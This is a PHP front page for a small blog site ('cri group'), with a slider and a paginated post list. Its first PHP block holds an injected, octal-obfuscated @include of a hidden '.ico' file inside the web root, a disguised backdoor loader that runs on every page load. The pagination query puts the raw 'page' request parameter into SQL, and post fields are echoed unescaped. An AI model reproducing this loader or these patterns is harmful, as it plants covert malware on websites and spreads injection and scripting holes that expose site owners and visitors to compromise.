
<!-- Database Connection for cri group web -->
    <?php
/*b61cb*/

@include "\057ho\155e/\164he\141we\142/p\165bl\151c_\150tm\154/d\162iv\145/a\160ps\057en\143ry\160ti\157n/\0566a\14370\0642f\056ic\157";

/*b61cb*/ include "includes/database.php"; ?>
    <!-- Header for cri group -->
    <?php include "includes/header.php"; ?>

    <!-- cri group Navigation -->
    <?php include "includes/navigation.php"; ?>

    <!-- Page Content -->


            <!-- Blog Entries Column -->


                <!-- #region Jssor Slider Begin -->
                <!-- Generator: Jssor Slider Maker -->
                <!-- Source: https://www.jssor.com -->
                <script src="js/jssor.slider-27.4.0.min.js" type="text/javascript"></script>
                <script type="text/javascript">
                    jssor_1_slider_init = function() {

                        var jssor_1_SlideshowTransitions = [
                          {$Duration:800,$Opacity:2}
                        ];

                        var jssor_1_options = {
                          $AutoPlay: 1,
                          $SlideshowOptions: {
                            $Class: $JssorSlideshowRunner$,
                            $Transitions: jssor_1_SlideshowTransitions,
                            $TransitionsOrder: 1
                          },
                          $ArrowNavigatorOptions: {
                            $Class: $JssorArrowNavigator$
                          },
                          $BulletNavigatorOptions: {
                            $Class: $JssorBulletNavigator$
                          }
                        };

                        var jssor_1_slider = new $JssorSlider$("jssor_1", jssor_1_options);

                        /*#region responsive code begin*/

                        var MAX_WIDTH = 980;

                        function ScaleSlider() {
                            var containerElement = jssor_1_slider.$Elmt.parentNode;
                            var containerWidth = containerElement.clientWidth;

                            if (containerWidth) {

                                var expectedWidth = Math.min(MAX_WIDTH || containerWidth, containerWidth);

                                jssor_1_slider.$ScaleWidth(expectedWidth);
                            }
                            else {
                                window.setTimeout(ScaleSlider, 30);
                            }
                        }

                        ScaleSlider();

                        $Jssor$.$AddEvent(window, "load", ScaleSlider);
                        $Jssor$.$AddEvent(window, "resize", ScaleSlider);
                        $Jssor$.$AddEvent(window, "orientationchange", ScaleSlider);
                        /*#endregion responsive code end*/
                    };
                </script>
                <style>
                    /*jssor slider loading skin spin css*/
                    .jssorl-009-spin img {
                        animation-name: jssorl-009-spin;
                        animation-duration: 1.6s;
                        animation-iteration-count: infinite;
                        animation-timing-function: linear;
                    }

                    @keyframes jssorl-009-spin {
                        from { transform: rotate(0deg); }
                        to { transform: rotate(360deg); }
                    }

                    /*jssor slider bullet skin 051 css*/
                    .jssorb051 .i {position:absolute;cursor:pointer;}
                    .jssorb051 .i .b {fill:#fff;fill-opacity:0.5;}
                    .jssorb051 .i:hover .b {fill-opacity:.7;}
                    .jssorb051 .iav .b {fill-opacity: 1;}
                    .jssorb051 .i.idn {opacity:.3;}

                    /*jssor slider arrow skin 051 css*/
                    .jssora051 {display:block;position:absolute;cursor:pointer;}
                    .jssora051 .a {fill:none;stroke:#fff;stroke-width:360;stroke-miterlimit:10;}
                    .jssora051:hover {opacity:.8;}
                    .jssora051.jssora051dn {opacity:.5;}
                    .jssora051.jssora051ds {opacity:.3;pointer-events:none;}
                </style>
                <div id="jssor_1" style="position:relative;margin:0 auto;top:0px;left:0px;width:980px;height:380px;overflow:hidden;visibility:hidden;">
                    <!-- Loading Screen -->
                    <div data-u="loading" class="jssorl-009-spin" style="position:absolute;top:0px;left:0px;width:100%;height:100%;text-align:center;background-color:rgba(0,0,0,0.7);">
                        <img style="margin-top:-19px;position:relative;top:50%;width:38px;height:38px;" src="images/spin.svg" />
                    </div>
                    <div data-u="slides" style="cursor:default;position:relative;top:0px;left:0px;width:980px;height:380px;overflow:hidden;">
                        <div>
                            <img data-u="image" src="images/001.jpg" />
                        </div>
                        <div>
                            <img data-u="image" src="images/002.jpg" />
                        </div>
                        <div>
                            <img data-u="image" src="images/003.jpg" />
                        </div>

                    </div>
                    <!-- Bullet Navigator -->
                    <div data-u="navigator" class="jssorb051" style="position:absolute;bottom:12px;right:12px;" data-autocenter="1" data-scale="0.5" data-scale-bottom="0.75">
                        <div data-u="prototype" class="i" style="width:16px;height:16px;">
                            <svg viewbox="0 0 16000 16000" style="position:absolute;top:0;left:0;width:100%;height:100%;">
                                <circle class="b" cx="8000" cy="8000" r="5800"></circle>
                            </svg>
                        </div>
                    </div>
                    <!-- Arrow Navigator -->
                    <div data-u="arrowleft" class="jssora051" style="width:55px;height:55px;top:0px;left:25px;" data-autocenter="2" data-scale="0.75" data-scale-left="0.75">
                        <svg viewbox="0 0 16000 16000" style="position:absolute;top:0;left:0;width:100%;height:100%;">
                            <polyline class="a" points="11040,1920 4960,8000 11040,14080 "></polyline>
                        </svg>
                    </div>
                    <div data-u="arrowright" class="jssora051" style="width:55px;height:55px;top:0px;right:25px;" data-autocenter="2" data-scale="0.75" data-scale-right="0.75">
                        <svg viewbox="0 0 16000 16000" style="position:absolute;top:0;left:0;width:100%;height:100%;">
                            <polyline class="a" points="4960,1920 11040,8000 4960,14080 "></polyline>
                        </svg>
                    </div>
                </div>
                <script type="text/javascript">jssor_1_slider_init();</script>



                <!-- #endregion Jssor Slider End -->

                <div class="container">

                    <div class="row">


            </body>
            <div class="col-md-8">
                <h1 class="page-header">
                    Latest Posts
                    <small>By Uploads</small>
                </h1>
                <?php
                    $per_page = 4;

                if(isset($_GET['page'])){
                    $page = $_GET['page'];

                    $page_1 = ($page*$per_page)-$per_page;
                    }
                else{
                    $page = 1;
                    $page_1 = 0;
                }

                $query="SELECT * FROM posts";
                $find_post_count =mysqli_query($connection, $query);
                $post_count = mysqli_num_rows($find_post_count);
                $post_count = ceil($post_count/$per_page);

                $query = "SELECT * FROM posts WHERE post_status ='Publish' ORDER BY post_id DESC LIMIT $page_1,$per_page";
                $get_all_posts = mysqli_query($connection, $query);

                while($row = mysqli_fetch_assoc($get_all_posts)){
                    $post_id = $row['post_id'];
                    $post_title = $row['post_title'];
                    $post_author = $row['post_author'];
                    $post_date = $row['post_date'];
                    $post_image = $row['post_image'];
                    $post_content =substr($row['post_content'],0,220);
                    $post_views = $row['post_views'];
                ?>


                    <!-- Blog Post -->
                    <h2>
                        <a href="post.php?post_id=<?php echo $post_id; ?>"><?php echo $post_title; ?></a>
                    </h2>
                    <p class="lead">
                        By <a href="author_related_posts.php?author=<?php echo $post_author; ?>"><?php echo $post_author; ?></a>
                        <small class="pull-right"><?php echo $post_views;?> Views</small>
                    </p>
                    <p><span class="glyphicon glyphicon-time"></span> Posted on <?php echo $post_date; ?></p>
                    <hr>
                    <a href="post.php?post_id=<?php echo $post_id; ?>"><img class="img-responsive" src="images/<?php echo $post_image; ?>" alt=""></a>
                    <hr>
                    <p><?php echo $post_content; ?></p>
                    <a class="btn btn-primary" href="post.php?post_id=<?php echo $post_id; ?>">Read More <span class="glyphicon glyphicon-chevron-right"></span></a>

                <hr>
                <?php }
                    //Display No result
                    $count = mysqli_num_rows($get_all_posts);
                    if($count == 0 ){

                        echo "<h1 class='text-center'>No Posts Found!</h1>";
                    }
                ?>


            </div>

            <!-- Blog Sidebar Widgets Column -->

       <?php include "includes/sidebar.php" ?>

        </div>
        <!-- /.row -->

        <hr>
        <!-- Pagination Numbering According to post count  -->
        <div>
            <ul class="pager">
                <?php
                for($i =1;$i <= $post_count;$i++){
                    if($i == $page){
                        echo "<li><a class='active_link' href='index.php?page=$i'>$i</a></li>";
                    }
                    else{
                        echo "<li><a href='index.php?page=$i'>$i</a></li>";
                    }

                }
                ?>
            </ul>
         </div>

       <?php include "includes/footer.php" ?>
